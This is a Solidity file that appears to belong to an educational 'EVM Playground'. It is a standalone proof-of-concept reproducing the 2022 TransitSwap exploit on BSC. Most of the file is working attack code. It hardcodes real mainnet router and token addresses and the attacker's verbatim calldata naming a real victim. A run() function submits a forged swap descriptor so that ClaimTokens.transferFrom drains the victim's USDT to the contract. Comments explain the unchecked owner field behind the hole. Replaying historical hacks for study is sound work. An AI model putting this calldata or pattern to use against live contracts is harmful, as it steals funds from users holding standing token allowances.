// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2022-10-TransitSwap).
//
// The DeFiHackLabs PoC (test/TransitSwap_exp.sol) runs the attack INLINE in the
// Foundry ContractTest — it is `address(this)` that both submits the malicious
// swap descriptor AND receives the drained tokens, so there is no standalone
// contract to deploy. This contract is a faithful, self-contained copy of that
// inline attack so the playground can deploy it and record run().
//
// Root cause: Transit Finance's cross-chain swap router lets the caller embed a
// fully attacker-controlled swap descriptor whose `owner`/`from` field flows
// unchecked into `ClaimTokens.claimTokens` → `IERC20.transferFrom(owner, to,
// amount)`. Nothing ties `owner` to `msg.sender`, so anyone can name a victim
// who holds a standing allowance to ClaimTokens and drain that victim's tokens
// to an attacker-controlled `to`. This PoC drains one victim (0x1aAe…19Fc) for
// 6,312.858905558909501615 BSC-USDT.
//
// The victim contracts (TransitSwap router, Bridge, ClaimTokens) are UNVERIFIED
// on BSC, so they cannot anchor a vulnerability locator. The vulnerability is
// therefore anchored on this synthetic exploit's `run()` body — the executable
// entry of the unvalidated-`owner` swap call — which is what "Go to
// vulnerability" + the story beats resolve against.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
}

contract TransitSwapDrain {
    IERC20 constant BUSDT = IERC20(0x55d398326f99059fF775485246999027B3197955); // BSC-USDT
    address constant TRANSIT_SWAP = 0x8785bb8deAE13783b24D7aFE250d42eA7D7e9d72;

    // The literal calldata the live attacker submitted to the TransitSwap router
    // (selector 0x006de4df), copied verbatim from test/TransitSwap_exp.sol. The
    // ONLY mutation is the inner `claimTokens` `to` field (the payout recipient,
    // byte offset 820 within this blob): the original hardcoded the test's own
    // address (0x7FA9385b…1496); we substitute address(this) the same way the
    // test implicitly did, so the drained tokens land in this contract.
    //
    // The descriptor names victim 0x1aAe0303f795b6FCb185ea9526Aa0549963319Fc as
    // `owner`/`from`, BSC-USDT as `token`, this contract as `to`, and the
    // victim's full balance (6312858905558909501615) as `amount`. Because the
    // victim has a near-maxuint standing allowance to ClaimTokens
    // (0xeD1afC8C…c428), the inner transferFrom succeeds and the tokens move
    // here in a single transaction.
    bytes constant PREFIX =
        hex"006de4df0000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000001c000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002170ed0880ac9a755fd29b2688956bd959f933f8000000000000000000000000a1137fe0cc191c11859c1d6fb81ae343d70cc17100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002707f79951b87b5400000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000012000000000000000000000000000000000000000000000000000000000000000380000000000000000000000000000000000000000000000000000000000000007616e64726f69640000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001c0000000000000000000000000ed1afc8c4604958c2f38a3408fa63b32e737c4280000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000000000000000000000e00000000000000000000000000000000000000000000000000000000000000007616e64726f69640000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a40a5ea46600000000000000000000000055d398326f99059ff775485246999027b31979550000000000000000000000001aae0303f795b6fcb185ea9526aa0549963319fc000000000000000000000000";
    // The 12-byte left-pad of the recipient word is the tail of PREFIX; the
    // recipient address itself is spliced in here, then the trailing suffix.
    bytes constant SUFFIX =
        hex"00000000000000000000000000000000000000000000015638842fa55808c0af00000000000000000000000000000000000000000000000000000000000077c800000000000000000000000000000000000000000000000000000000";

    function run() external {
        // Build the malicious swap descriptor: prefix ++ address(this) ++ suffix.
        // The router hands the descriptor to the Bridge, which calls
        // ClaimTokens.claimTokens(BUSDT, victim, address(this), amount), and
        // ClaimTokens runs BUSDT.transferFrom(victim, address(this), amount) —
        // succeeding on the victim's standing allowance, with NO check that the
        // caller is the owner. The tokens move here in one call.
        bytes memory payload = abi.encodePacked(PREFIX, address(this), SUFFIX);
        (bool ok,) = TRANSIT_SWAP.call(payload);
        require(ok, "TransitSwap call failed");
    }
}
